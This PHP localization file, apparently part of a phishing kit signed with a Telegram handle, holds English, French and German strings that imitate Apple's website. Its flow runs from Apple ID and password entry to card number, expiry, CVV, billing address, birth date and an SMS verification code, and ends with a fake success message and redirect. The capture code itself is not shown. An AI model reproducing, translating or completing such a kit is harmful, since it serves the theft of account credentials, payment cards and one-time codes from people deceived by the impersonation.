<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/

    $lang = array(

        'menu1' => array(
            'en' => 'Store',
            'fr' => 'Store',
            'de' => 'Store',
        ),

        'menu2' => array(
            'en' => 'Mac',
            'fr' => 'Mac',
            'de' => 'Mac',
        ),

        'menu3' => array(
            'en' => 'iPad',
            'fr' => 'iPad',
            'de' => 'iPad',
        ),

        'menu4' => array(
            'en' => 'iPhone',
            'fr' => 'iPhone',
            'de' => 'iPhone',
        ),

        'menu5' => array(
            'en' => 'Watch',
            'fr' => 'Watch',
            'de' => 'Watch',
        ),

        'menu6' => array(
            'en' => 'AirPods',
            'fr' => 'AirPods',
            'de' => 'AirPods',
        ),

        'menu7' => array(
            'en' => 'Tv & Home',
            'fr' => 'TV & Maison',
            'de' => 'TV & Home',
        ),

        'menu8' => array(
            'en' => 'Only on apple',
            'fr' => 'Exclusivités Apple',
            'de' => 'Nur mit Apple',
        ),

        'menu9' => array(
            'en' => 'Accessories',
            'fr' => 'Accessoires',
            'de' => 'Zubehör',
        ),

        'menu10' => array(
            'en' => 'Support',
            'fr' => 'Assistance',
            'de' => 'Support',
        ),

        'apple_id' => array(
            'en' => 'Apple ID',
            'fr' => 'Identifiant Apple',
            'de' => 'Apple‑ID',
        ),

        'smenu1' => array(
            'en' => 'Sign In',
            'fr' => 'Connectez-vousConnectez',
            'de' => 'Anmelden',
        ),
        'smenu2' => array(
            'en' => 'Create Your Apple ID',
            'fr' => 'Créez votre identifiant Apple',
            'de' => 'Deine Apple‑ID erstellen',
        ),

        'smenu3' => array(
            'en' => 'FAQ',
            'fr' => 'Q&R',
            'de' => 'FAQ',
        ),

        'manage' => array(
            'en' => 'Manage your Apple account',
            'fr' => 'Gérer votre compte Apple',
            'de' => 'Verwalte deinen Apple‑Account',
        ),

        'password' => array(
            'en' => 'Password',
            'fr' => 'Mot de passe',
            'de' => 'Passwort',
        ),

        'error_login' => array(
            'en' => 'Your Apple ID or password was incorrect. <span>Forgot password?</span>',
            'fr' => 'Votre identifiant Apple ou votre mot de passe était incorrect. <span>Mot de passe oublié?</span>',
            'de' => 'Ihre Apple ID oder Ihr Passwort war falsch. <span>Passwort vergessen?</span>',
        ),

        'remember' => array(
            'en' => 'Remember me',
            'fr' => 'Se souvenir de moi',
            'de' => 'Apple-ID merken',
        ),

        'forget' => array(
            'en' => 'Forgotten your Apple ID or password?',
            'fr' => 'Identifiant Apple ou mot de passe oublié ?',
            'de' => 'Apple‑ID oder Passwort vergessen?',
        ),

        'footer_text' => array(
            'en' => 'More ways to shop: <a href="" class="apple-link">Find an Apple Store</a> or <a href="" class="apple-link">other retailer</a> near you. Or call 1-800-MY-APPLE.',
            'fr' => 'Vous pouvez aussi faire vos achats <a href="" class="apple-link">dans un Apple Store</a> ou <a href="" class="apple-link">chez un revendeur</a> Ou appeler le 0800 046 046.',
            'de' => 'Weitere Einkaufsmöglichkeiten: <a href="" class="apple-link">Finde einen Apple Store</a> oder <a href="" class="apple-link">einen anderen Händler</a> in deiner Nähe. Oder ruf an unter 0800 2000 136.',
        ),

        'copyright' => array(
            'en' => 'Copyright © '. date('Y') .' Apple Inc. All rights reserved.',
            'fr' => 'Copyright © '. date('Y') .' Apple Inc. Tous droits réservés.',
            'de' => 'Copyright © '. date('Y') .' Apple Inc. Alle Rechte vorbehalten.',
        ),

        'footer1' => array(
            'en' => 'Privacy Policy',
            'fr' => 'Engagement de confidentialité',
            'de' => 'Datenschutzrichtlinie',
        ),

        'footer2' => array(
            'en' => 'Terms of Use',
            'fr' => 'Utilisation des cookies',
            'de' => 'Verwendung von Cookies',
        ),

        'footer3' => array(
            'en' => 'Sales and Refunds',
            'fr' => 'Conditions d’utilisation',
            'de' => 'Nutzungsbedingungen',
        ),

        'footer4' => array(
            'en' => 'Legal',
            'fr' => 'Ventes et remboursements',
            'de' => 'Verkauf und Rückerstattung',
        ),

        'footer5' => array(
            'en' => 'Site Map',
            'fr' => 'Mentions légales',
            'de' => 'Rechtliche Hinweise',
        ),

        'details_title' => array(
            'en' => 'Confirm your details',
            'fr' => 'Confirmez vos coordonnées',
            'de' => 'Bestätigen Sie Ihre Angaben',
        ),

        'details_subtitle1' => array(
            'en' => 'ENTER YOUR CARD INFORMATION',
            'fr' => 'ENTRER LES INFORMATIONS DE VOTRE CARTE',
            'de' => 'GEBEN SIE IHRE KARTENINFORMATIONEN EIN',
        ),

        'details_subtitle2' => array(
            'en' => 'BILLING ADDRESS',
            'fr' => 'ADRESSE DE FACTURATION',
            'de' => 'RECHNUNGSADRESSE',
        ),

        'details_text1' => array(
            'en' => 'This payment method will be used when you purchase from the iTunes Store, App Store, Apple Online Store, and more.',
            'fr' => 'Ce mode de paiement sera utilisé lors de vos achats sur l\'iTunes Store, l\'App Store, l\'Apple Store en ligne, etc.',
            'de' => 'Diese Zahlungsmethode wird verwendet, wenn Sie im iTunes Store, App Store, Apple Online Store und anderen einkaufen.',
        ),

        'details_text2' => array(
            'en' => 'By adding contact details, you help your loved ones reach you through iMessage, FaceTime, Game Center and more.',
            'fr' => 'En ajoutant des coordonnées, vous aidez vos proches à vous joindre via iMessage, FaceTime, Game Center et plus encore.',
            'de' => 'Indem Sie Kontaktdaten hinzufügen, helfen Sie Ihren Lieben, Sie über iMessage, FaceTime, Game Center und mehr zu erreichen.',
        ),

        'one_placeholder' => array(
            'en' => 'Credit/Debit card Number',
            'fr' => 'Numéro de carte de crédit/débit',
            'de' => 'Kredit-/Debitkartennummer',
        ),

        'two_placeholder' => array(
            'en' => 'Expiration date (MM/YY)',
            'fr' => 'Date d\'expiration (MM/AA)',
            'de' => 'Ablaufdatum (MM/JJ)',
        ),

        'three_placeholder' => array(
            'en' => 'CVV',
            'fr' => 'CVV',
            'de' => 'CVV',
        ),

        'first_name_placeholder' => array(
            'en' => 'First name',
            'fr' => 'Prénom',
            'de' => 'Vorname',
        ),

        'last_name_placeholder' => array(
            'en' => 'Last name',
            'fr' => 'Nom',
            'de' => 'Nachname',
        ),

        'address_placeholder' => array(
            'en' => 'Address',
            'fr' => 'Adresse',
            'de' => 'Adresse',
        ),

        'zip_code_placeholder' => array(
            'en' => 'Postal code',
            'fr' => 'Code postal',
            'de' => 'Postleitzahl',
        ),

        'city_placeholder' => array(
            'en' => 'City',
            'fr' => 'Ville',
            'de' => 'Stadt',
        ),

        'phone_placeholder' => array(
            'en' => 'Phone number',
            'fr' => 'Numéro de téléphone',
            'de' => 'Telefonnummer',
        ),

        'birth_date_placeholder' => array(
            'en' => 'Birth date (DD/MM/YYYY)',
            'fr' => 'Date de naissance (JJ/MM/AAAA)',
            'de' => 'Geburtsdatum (TT/MM/JJJJ)',
        ),

        'continue' => array(
            'en' => 'Continue',
            'fr' => 'Continuer',
            'de' => 'Fortsetzen',
        ),

        'loading' => array(
            'en' => 'Loading',
            'fr' => 'Chargement',
            'de' => 'Wird geladen',
        ),

        'sms_title' => array(
            'en' => "Let's verify it's you",
            'fr' => "Vérifions qu'il s'agit bien de vous",
            'de' => "Lassen Sie uns überprüfen, ob Sie es sind",
        ),

        'sms_text' => array(
            'en' => 'A message with a verification code has been sent to your phone number. Enter the code to continue.',
            'fr' => 'Un message avec un code de vérification a été envoyé à votre numéro de téléphone. Entrez le code pour continuer.',
            'de' => 'Eine Nachricht mit einem Bestätigungscode wurde an Ihre Telefonnummer gesendet. Geben Sie den Code ein, um fortzufahren.',
        ),

        'sms_placeholder' => array(
            'en' => 'SMS Code',
            'fr' => 'Code SMS',
            'de' => 'SMS-Code',
        ),

        'sms_link' => array(
            'en' => 'Didn’t get a verification code?',
            'fr' => 'Vous n\'avez pas reçu de code de vérification?',
            'de' => 'Sie haben keinen Bestätigungscode erhalten?',
        ),

        'success_title' => array(
            'en' => 'Account updated successfully',
            'fr' => 'Compte mis à jour avec succès',
            'de' => 'Konto erfolgreich aktualisiert',
        ),

        'success_text' => array(
            'en' => 'You will be redirected to our privacy after 5 seconds.',
            'fr' => 'Vous serez redirigé vers notre confidentialité après 5 secondes.',
            'de' => 'Sie werden nach 5 Sekunden zu unserer Privatsphäre weitergeleitet.',
        ),

    );

?>